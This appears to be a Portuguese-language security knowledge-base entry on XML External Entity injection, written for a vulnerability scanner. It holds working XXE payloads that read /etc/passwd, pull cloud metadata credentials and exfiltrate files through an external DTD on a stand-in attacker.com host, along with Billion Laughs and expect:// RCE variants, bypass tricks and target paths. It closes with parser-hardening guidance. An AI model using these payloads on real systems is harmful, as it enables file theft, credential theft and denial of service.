---
id: xxe
title: "XML External Entity Injection"
module: "xxe"
severity: "HIGH"
cwe_id: "CWE-611"
cwe_title: "Improper Restriction of XML External Entity Reference"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "injection.xml_external_entity_injection"
---

## Summary
Parsers XML que resolvem entidades externas permitem leitura de arquivos locais, SSRF, exfiltração out-of-band e, em alguns casos, RCE. Qualquer endpoint que aceite XML, SVG, DOCX/XLSX ou SOAP pode ser afetado.

## Description
XML permite declarar entidades personalizadas no `DOCTYPE`. Quando o parser tem `external entities` habilitadas, uma entidade pode referenciar `file://`, `http://` ou outros esquemas, e o conteúdo é resolvido durante o parse. Isso permite:

- **XXE clássico:** conteúdo do arquivo é refletido na resposta.
- **XXE cego:** sem reflexão, confirmado via OOB (DNS/HTTP) ou erro.
- **XXE OOB:** entidades parametrizadas e DTD externo exfiltram dados para um servidor controlado.
- **SSRF via XXE:** requisições internas para metadata/cloud e serviços internos.
- **Billion laughs / DoS:** expansão de entidades causa consumo de memória/CPU.
- **RCE:** via `expect://` (PHP), desserialização em Java ou cadeias específicas de parser.

Formatos alternativos que carregam XML: SVG, DOCX, XLSX, PPTX, SOAP, RSS, SAML, XHTML, configurações e uploads "XML".

## Impact
- Leitura de arquivos sensíveis (`/etc/passwd`, chaves, configurações, `.env`).
- Roubo de credenciais cloud via metadata (SSRF).
- Exfiltração de dados internos e movimento lateral.
- DoS por expansão de entidades.
- Em casos específicos, execução remota de código.
- Impacto HIGH; pode ser CRITICAL com RCE ou credenciais cloud.

## Payloads and Bypasses
```xml
<!-- XXE clássico: leitura de arquivo -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

```xml
<!-- XXE via PHP filter -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<foo>&xxe;</foo>
```

```xml
<!-- SSRF via XXE para metadata -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

```xml
<!-- XXE cego com DTD externo -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

`evil.dtd`:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;
```

```xml
<!-- XXE OOB com parâmetro -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/collect?data=test">
  %xxe;
]>
```

Variações e bypasses:
```text
- SVG: <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
- DOCX/XLSX: inserir evil.xml em word/document.xml ou [Content_Types].xml
- SOAP: colocar DOCTYPE antes de <soap:Envelope>
- UTF-16/UTF-7 encoding para bypass de filtros
- Entidades parametrizadas quando entidades gerais são bloqueadas
- `SYSTEM "file:///etc/hostname"` para confirmar leitura
- `expect://id` em PHP com expect habilitado
- `jar:file:///...!/` e `gopher://` para SSRF
- Negação de serviço: Billion Laughs
```

Billion Laughs:
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

Casos reais e mentalidade de ataque (RWBH): Yahoo (parsers XML em mail/upload) e Facebook (DOCX/XLSX) mostram que o vetor não é só SOAP; o atacante testa SVG, DOCX, SAML e OOB quando a resposta não reflete o arquivo.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `xml`, `data`, `document`, `file`, `upload`, `content`, `body`, `payload`, `svg`, `feed`, `soap`, `saml`, `config`.
- **Paths comuns:** `/api/import`, `/upload`, `/xml`, `/soap`, `/saml`, `/parse`, `/convert`, `/preview`, `/avatar`, `/invoice`, `/export`.
- **Sinais:** `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; upload de SVG/DOCX/XLSX; resposta contém conteúdo de arquivo; erros de parser com path local.

## Recommendation
1. Desabilitar DTDs e entidades externas no parser. Em Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```
2. Para StAX/SAX, desabilitar `external-general-entities`, `external-parameter-entities` e `load-external-dtd`; usar `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false`.
3. Para Python, usar `defusedxml`; para .NET, `XmlReaderSettings.DtdProcessing = Prohibit` e `XmlResolver = null`.
4. Preferir JSON quando possível; se XML for necessário, validar contra XSD e rejeitar `DOCTYPE`.
5. Limitar tamanho de payload, profundidade e expansão de entidades; configurar timeout e memória.
6. Em uploads, validar tipo real, desabilitar processamento de XML em SVG/DOCX e usar sandbox para conversão.
7. Segregar o parser de XML em serviço isolado, sem acesso a filesystem/network, quando inevitável.
8. Monitorar requisições com `DOCTYPE`, `SYSTEM`, `PUBLIC`, `file://` e chamadas OOB.
